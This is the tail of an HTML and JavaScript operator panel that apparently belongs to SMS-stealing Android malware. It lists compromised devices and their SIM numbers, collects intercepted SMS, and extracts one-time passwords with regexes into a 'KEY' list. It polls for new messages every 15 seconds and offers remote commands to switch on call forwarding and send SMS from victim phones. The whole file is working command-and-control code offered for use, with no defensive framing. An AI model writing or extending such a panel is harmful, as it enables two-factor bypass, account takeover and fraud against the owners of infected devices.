  var html = '', lim = Math.min(all.length, 200);
  for (var i = 0; i < lim; i++) {
    var m = all[i], b = m.body || '', di = m._dev || '', dv = '';
    if (DEV[di]) dv = DEV[di].d_name || DEV[di].Device_Name || 'Device';
    html += '<div class="sms-i glass"><div class="s-sender" style="color:#f03ca0">KEY ' + esc(m._otp) + '</div>'
      + '<div class="s-via">via <span class="v-link" onclick="closeModal();openD(\'' + esc(di) + '\')">' + esc(dv||di.slice(0,12)) + '</span></div>'
      + '<div class="s-body">' + esc(b) + '</div><div class="s-btm"><span>' + fmt(m.date||m.timestamp) + '</span>'
      + '<span class="s-otp" onclick="copy(\'' + esc(m._otp) + '\')">' + esc(m._otp) + '</span>'
      + '<span class="s-cp" onclick="copy(\'' + esc(b) + '\')">Copy</span></div></div>';
  }
  if (!all.length) html = '<div class="sms-e">' + (q ? 'No matches' : 'No OTPs found') + '</div>';
  document.getElementById('otpL').innerHTML = html;
  document.getElementById('otpP').textContent = OTP_CACHE.length + ' OTPs';
}

function extOtp(t) {
  var m = t.match(/(?:OTP|code|verif|login|one.?time|otp)\s*(?::|is)?\s*(\d{4,8})/i);
  if (m) return m[1];
  m = t.match(/\b(\d{4,8})\b/);
  return m ? m[1] : null;
}

// ====== SIM NUMBERS TAB ======
function buildSims() {
  var nums = {};
  DLIST.forEach(function(i) {
    var dev = i.dev, p = ph(dev);
    var n1 = nv(dev.numberSim1), n2 = nv(dev.numberSim2);
    var allPhones = {};
    if (p) allPhones[p] = 1;
    if (n1 && n1 !== p) allPhones[n1] = 1;
    if (n2 && n2 !== p && n2 !== n1) allPhones[n2] = 1;
    Object.keys(allPhones).forEach(function(num) {
      if (!nums[num]) nums[num] = { num: num, devices: {}, sms: [] };
      if (!nums[num].devices[i.id]) nums[num].devices[i.id] = dev;
    });
  });
  // Attach SMS to numbers via device ownership
  SMS_CACHE.forEach(function(s) {
    var devId = s._dev || '';
    if (!devId || !DEV[devId]) return;
    var dev = DEV[devId];
    var p = ph(dev), n1 = nv(dev.numberSim1), n2 = nv(dev.numberSim2);
    var simSlot = (s.sim_number || '').toLowerCase();
    var targetNums = {};
    if (simSlot.includes('2') || simSlot.includes('sim2')) {
      if (n2) targetNums[n2] = 1;
      else if (n1) targetNums[n1] = 1;
      else if (p) targetNums[p] = 1;
    } else {
      if (n1) targetNums[n1] = 1;
      else if (n2) targetNums[n2] = 1;
      else if (p) targetNums[p] = 1;
    }
    Object.keys(targetNums).forEach(function(num) {
      if (nums[num]) nums[num].sms.push(s);
    });
  });
  SIMS_CACHE = Object.keys(nums).sort().map(function(k) { return nums[k] });
  filterSims();
}

function nv(v) { return (v && v !== 'Not Available' && v !== 'No Data' && v !== 'No SIM Found' && v !== 'Unknown' && v !== 'Restricted' && v !== '-') ? v : '' }

function filterSims() {
  var q = document.getElementById('simS').value.toLowerCase();
  var all = SIMS_CACHE;
  if (q) all = all.filter(function(s) { return s.num.includes(q) });
  if (SIMF === 'online') {
    all = all.filter(function(s) { var devs = Object.values(s.devices); return devs.some(function(d) { return d.status === 'online' }) });
  }
  var html = '';
  all.forEach(function(s) {
    var devList = Object.values(s.devices);
    var onDev = devList.filter(function(d) { return d.status === 'online' }).length;
    var totalSms = s.sms.length;
    html += '<div class="d-card glass" onclick="showSimDetail(\'' + esc(s.num) + '\')">'
      + '<div class="d-top"><div class="d-name" style="font-size:14px;letter-spacing:.5px">' + esc(s.num) + '</div><div class="d-status" style="border:1px solid rgba(108,60,240,.15);color:#6c3cf0;background:rgba(108,60,240,.06)">' + devList.length + ' dev</div></div>'
      + '<div class="d-row">'
      + '<div>Online: <strong style="color:#1ec864">' + onDev + '</strong></div>'
      + '<div>SMS: <strong style="color:#f0b41e">' + totalSms + '</strong></div>';
    devList.forEach(function(dev) {
      html += '<div class="full" style="font-size:10px">' + esc(dev.d_name||'Device') + ' [' + (dev.status||'offline') + '] ' + esc(dev.numberSim1||'') + '</div>';
    });
    html += '</div><div style="margin-top:6px;font-size:10px;color:rgba(255,255,255,.2)">' + (totalSms ? 'Click to view SMS' : 'No SMS') + '</div></div>';
  });
  if (!all.length) html = '<div class="sms-e">' + (q ? 'No matches' : 'No SIM numbers found') + '</div>';
  document.getElementById('simGrid').innerHTML = html;
  document.getElementById('simP').textContent = all.length + ' numbers';
}

function setSimF(f, btn) {
  SIMF = f;
  document.querySelectorAll('#tSims .toolbar .f-btn').forEach(function(b) { b.classList.remove('act') });
  if (btn) btn.classList.add('act');
  filterSims();
}

function showSimDetail(num) {
  var entry = null;
  SIMS_CACHE.forEach(function(e) { if (e.num === num) entry = e });
  if (!entry || !entry.sms.length) { document.getElementById('smsS').value = num; switchTab('sms', document.querySelector('#tabBar .tab-btn:nth-child(2)')); filterSms(); return }
  var html = '<div style="margin-bottom:12px;font-size:12px;color:rgba(255,255,255,.3)">Number: <strong style="color:#fff;letter-spacing:.5px">' + esc(num) + '</strong> | SMS: ' + entry.sms.length + '</div>';
  html += '<div class="sms-l">';
  entry.sms.slice(0, 50).forEach(function(m) {
    var b = m.body || '', o = extOtp(b);
    var dv = '', di = m._dev || '';
    if (DEV[di]) dv = DEV[di].d_name || 'Device';
    html += '<div class="sms-i glass"><div class="s-sender">' + esc(m.sender||'Unknown') + '</div>'
      + '<div class="s-via">via <span class="v-link" onclick="closeModal();openD(\'' + esc(di) + '\')">' + esc(dv||di.slice(0,12)) + '</span></div>'
      + '<div class="s-body">' + esc(b) + '</div><div class="s-btm"><span>' + fmt(m.date||m.timestamp) + '</span>'
      + (o ? '<span class="s-otp" onclick="copy(\'' + esc(o) + '\')">' + esc(o) + '</span>' : '')
      + '<span class="s-cp" onclick="copy(\'' + esc(b) + '\')">Copy</span></div></div>';
  });
  if (entry.sms.length > 50) html += '<div class="sms-e">Showing 50 of ' + entry.sms.length + '</div>';
  html += '</div>';
  document.getElementById('modalT').textContent = 'SIM: ' + num;
  document.getElementById('modalTabs').style.display = 'none';
  document.getElementById('mInfo').innerHTML = html;
  document.getElementById('mInfo').style.display = 'block';
  document.getElementById('mSms').style.display = 'none';
  document.getElementById('mFwd').style.display = 'none';
  document.getElementById('mSend').style.display = 'none';
  document.getElementById('modalOver').classList.add('open');
  document.body.style.overflow = 'hidden';
}

// ====== TABS ======
function switchTab(t, btn) {
  document.querySelectorAll('.tab-btn').forEach(function(b) { b.classList.remove('active') });
  if (btn) btn.classList.add('active');
  document.querySelectorAll('.tab-p').forEach(function(p) { p.classList.remove('active'); p.style.display = 'none' });
  var map = { devices: 'tDevices', sms: 'tSms', otp: 'tOtp', sims: 'tSims' };
  var el = document.getElementById(map[t]);
  if (el) { el.classList.add('active'); el.style.display = 'block' }
  if (t === 'sms') {
    if (!SMS_CACHE.length) loadSms();
    else { filterSms(); buildOtps(); }
  }
  if (t === 'otp' && !OTP_CACHE.length && SMS_CACHE.length) buildOtps();
  if (t === 'sims') { if (!SIMS_CACHE.length) buildSims(); else filterSims(); }
}

// ====== MODAL ======
function openD(id) {
  var dev = DEV[id]; if (!dev) return;
  MID = id; MDB = IDX[id] || ''; MSMS = [];
  var p = ph(dev), st = dev.status || 'offline', b = parseInt(dev.battery||dev.battery_level||0) || 0;
  var model = dev.d_name || dev.Device_Name || 'Device';
  var info = dev.Device_info || '';
  var nm = sn(dev), n1 = dev.numberSim1 || '', n2 = dev.numberSim2 || '';
  document.getElementById('modalT').textContent = model;
  var h = '<div class="d-row">';
  if (p) h += '<div>Phone: <strong>' + esc(p) + '</strong><span class="d-copy" style="opacity:1" onclick="copy(\'' + esc(p) + '\')">Copy</span></div>';
  h += '<div>Status: <strong>' + st + '</strong></div>';
  if (nm) h += '<div>Operator: <strong>' + esc(nm) + '</strong></div>';
  if (n1) h += '<div>SIM1: <strong>' + esc(n1) + '</strong></div>';
  if (n2) h += '<div>SIM2: <strong>' + esc(n2) + '</strong></div>';
  h += '<div>Battery: <strong>' + b + '%</strong></div>';
  h += '<div class="full">DB: <strong>' + esc(MDB) + '</strong></div>';
  h += '<div class="full">ID: <span style="font-size:10px;opacity:.4">' + esc(id) + '</span></div>';
  if (info) h += '<div class="full"><pre style="font-size:10px;opacity:.6;margin-top:6px;line-height:1.3">' + esc(info) + '</pre></div>';
  h += '</div>';
  document.getElementById('mInfo').innerHTML = h;
  document.getElementById('mSms').innerHTML = '<div class="load"><div class="sp"></div></div>';
  document.getElementById('mFwd').innerHTML = '';
  document.getElementById('mSend').innerHTML = '';
  switchMT('info', document.querySelector('.modal-tab'));
  document.getElementById('modalOver').classList.add('open');
  document.body.style.overflow = 'hidden';
  // Load SMS
  if (MDB) api('sms', { id: MID, db: MDB }).then(function(d) {
    MSMS = d || [];
    renderMSms();
  });
  renderMFwd();
  renderMSend();
}

function closeModal() {
  document.getElementById('modalOver').classList.remove('open');
  document.body.style.overflow = '';
  document.getElementById('modalTabs').style.display = '';
}

function switchMT(t, btn) {
  document.querySelectorAll('.modal-tab').forEach(function(b) { b.classList.remove('act') });
  if (btn) btn.classList.add('act');
  document.querySelectorAll('.modal-p').forEach(function(p) { p.classList.remove('act'); p.style.display = 'none' });
  var map = { info: 'mInfo', sms: 'mSms', fwd: 'mFwd', send: 'mSend' };
  var el = document.getElementById(map[t]);
  if (el) { el.classList.add('act'); el.style.display = 'block' }
}

function renderMSms() {
  var h = '<div class="sms-l">';
  MSMS.forEach(function(m) {
    var b = m.body || '', o = extOtp(b);
    h += '<div class="sms-i glass"><div class="s-sender">' + esc(m.sender||'Unknown') + '</div>'
      + '<div class="s-body">' + esc(b) + '</div><div class="s-btm"><span>' + fmt(m.date||m.timestamp) + '</span>'
      + (o ? '<span class="s-otp" onclick="copy(\'' + esc(o) + '\')">' + esc(o) + '</span>' : '')
      + '<span class="s-cp" onclick="copy(\'' + esc(b) + '\')">Copy</span></div></div>';
  });
  h += '</div>';
  if (!MSMS.length) h = '<div class="sms-e">No SMS found for this device</div>';
  document.getElementById('mSms').innerHTML = h;
}

function renderMFwd() {
  var dev = DEV[MID] || {};
  var st = dev._fwd || dev._fwd_status || '';
  var ph = (dev.ussd_response||'').includes('successful') ? 'Active' : (st || 'Unknown');
  document.getElementById('mFwd').innerHTML = '<div style="font-size:12px;color:rgba(255,255,255,.4);margin-bottom:12px">Call Forwarding Status: <strong style="color:' + (st==='Activate'?'#1ec864':'#f03c6c') + '">' + esc(st||'Unknown') + '</strong></div>'
    + '<div class="toolbar"><button class="f-btn" onclick="toggleFwd(\'Activate\')">Activate</button><button class="f-btn" onclick="toggleFwd(\'Deactivate\')">Deactivate</button></div>';
}

function toggleFwd(st) {
  var dev = DEV[MID] || {};
  var ph = dev.phoneNumber || dev.numberSim1 || dev.number || '';
  if (!ph || !MDB) { show('Missing data'); return }
  api('call_fwd', { id: MID, db: MDB }, { phone: ph, status: st }).then(function(d) {
    show(st === 'Activate' ? 'Forwarding Activated' : 'Forwarding Deactivated');
    if (d && d.ok) { DEV[MID]._fwd = st; renderMFwd() }
  });
}

function renderMSend() {
  document.getElementById('mSend').innerHTML = '<div style="display:flex;flex-direction:column;gap:8px">'
    + '<input id="smsT" placeholder="Phone number" style="padding:12px;border:1px solid rgba(255,255,255,.04);border-radius:8px;background:rgba(255,255,255,.025);color:#fff;font-size:13px;font-family:inherit;outline:none">'
    + '<input id="smsB" placeholder="Message text" style="padding:12px;border:1px solid rgba(255,255,255,.04);border-radius:8px;background:rgba(255,255,255,.025);color:#fff;font-size:13px;font-family:inherit;outline:none">'
    + '<button class="h-btn prim" style="text-align:center" onclick="doSend()">Send Command</button></div>';
}

function doSend() {
  var to = document.getElementById('smsT').value.trim(), body = document.getElementById('smsB').value.trim();
  if (!to || !body) { show('Fill all fields'); return }
  if (!MDB) { show('No DB'); return }
  api('send_sms', { id: MID, db: MDB }, { to: to, body: body, from: 'SIM 1' }).then(function(d) {
    show('SMS sent to ' + to);
    document.getElementById('smsT').value = ''; document.getElementById('smsB').value = '';
  }).catch(function() { show('Failed') });
}

// ====== POLLING ======
function startPoll() {
  if (polling) clearInterval(polling);
  polling = setInterval(function() {
    // Poll for new SMS only (lightweight)
    var db = document.getElementById('smsDb').value;
    api('all_sms', { db: db || '' }).then(function(all) {
      if (!all || !all.length) return;
      var oldCount = SMS_CACHE.length;
      var seen = {};
      SMS_CACHE.forEach(function(s) { var k = s.body + '_' + s.sender + '_' + (s._dev||''); seen[k] = 1 });
      var newSms = [];
      all.forEach(function(s) { var k = s.body + '_' + s.sender + '_' + (s._dev||''); if (!seen[k]) { seen[k] = 1; newSms.push(s) } });
      if (newSms.length) {
        SMS_CACHE = newSms.concat(SMS_CACHE);
        SMS_CACHE.sort(function(a, b) { return (b.timestamp||b.date||0) - (a.timestamp||a.date||0) });
        document.getElementById('sSms').textContent = SMS_CACHE.length;
        filterSms();
        buildSims();
        if (newSms.length) show(newSms.length + ' new SMS');
      }
    });
  }, 15000);
}

function fmt(t) {
  if (!t) return '';
  if (typeof t === 'string' && t.match(/^\d{2}\/\d{2}\/\d{4}/)) {
    var p = t.split(/[\s\/:]/);
    var d = new Date(p[2], p[1]-1, p[0], p[3]||0, p[4]||0, p[5]||0);
    if (p[6] && p[6].toLowerCase() === 'pm' && p[3] < 12) d.setHours(d.getHours() + 12);
    if (p[6] && p[6].toLowerCase() === 'am' && p[3] === 12) d.setHours(0);
    if (!isNaN(d.getTime())) return d.toLocaleString();
  }
  var d = new Date(Number(t) || t);
  if (!isNaN(d.getTime())) return d.toLocaleString();
  return String(t).slice(0,16);
}

// Init auto-sync after login
var origLogin = doLogin;
doLogin = function() {
  var p = document.getElementById('loginP').value;
  api('login', null, { password: p }).then(function(d) {
    if (d && d.ok) {
      document.getElementById('loginScr').style.display = 'none';
      document.getElementById('mainScr').style.display = 'block';
      doSync();
      startPoll();
    } else {
      document.getElementById('loginE').textContent = 'Access Denied';
      document.getElementById('loginE').style.display = 'block';
    }
  }).catch(function() {
    document.getElementById('loginE').textContent = 'Connection Failed';
    document.getElementById('loginE').style.display = 'block';
  });
};
</script>
</body>
</html>
